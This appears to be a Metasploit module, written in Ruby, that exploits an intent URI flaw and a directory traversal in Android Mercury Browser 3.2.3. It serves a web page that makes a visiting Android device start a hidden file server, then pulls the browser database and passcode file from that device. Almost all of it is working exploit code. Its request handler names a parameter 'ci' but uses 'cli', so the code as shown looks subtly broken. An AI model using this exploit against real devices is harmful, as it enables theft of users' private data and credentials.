##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability',
      'Description'    => %q{
        This module exploits an unsafe intent URI scheme and directory traversal found in
        Android Mercury Browser version 3.2.3. The intent allows the attacker to invoke a
        private wifi manager activity, which starts a web server for Mercury on port 8888.
        The webserver also suffers a directory traversal that allows remote access to
        sensitive files.
      },
      'Author'         =>
        [
          'rotlogix', # Vuln discovery, PoC, etc
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/' ]
        ]
    ))
  end

  def send_http_request(rhost, opts={})
    res = nil
    cli = Rex::Proto::Http::Client.new(rhost, 8888)

    begin
      cli.connect
      req = cli.request_cgi(opts)
      res = cli.send_recv(req)
    rescue ::EOFError, Errno::ETIMEDOUT ,Errno::ECONNRESET, Rex::ConnectionError,
      OpenSSL::SSL::SSLError, ::Timeout::Error => e
      return nil
    ensure
      cli.close
    end

    res
  end

  def get_xml_files(rhost)
    base_dir = '../../../../data/data/com.ilegendsoft.mercury'

    ['mercury_database.db', '/shared_prefs/passcode.xml'].each do |item|
      opts = {
        'method' => 'GET',
        'uri' => '/dodownload',
        'vars_get' => {
          'fname' => "#{base_dir}#{item}"
        },
        'headers' => {
          'Referer' => "http://#{rhost}:8888/storage/emulated/0/Download/"
        }
      }

      print_status("Retrieving #{item}")
      res = send_http_request(rhost, opts)
      next unless res
      print_status("Server response: #{res.code}")
      p = store_loot('android.mercury.file', 'application/octet-stream', rhost, res.body)
      print_good("#{item} saved as: #{p}")
    end
  end

  def is_android?(user_agent)
    user_agent.include?('Android')
  end

  def get_html
    %Q|
    <html>
    <head>
    <meta charset="utf-8" />
    </head>
    <body>
    <script>
    location.href="intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";
    </script>
    </body>
    </html>
    |
  end

  def on_request_uri(ci, req)
    print_status("Requesting: #{req.uri}")

    unless is_android?(req.headers['User-Agent'])
      print_error('Target is not Android')
      send_not_found(cli)
      return
    end

    print_status('Sending HTML...')
    html = get_html
    send_response_html(cli, html)

    print_status("Attempting to connect to: http://#{cli.peerhost}:8888/")
    sleep(2)
    get_xml_files(cli.peerhost)
  end

  def run
    exploit
  end

end
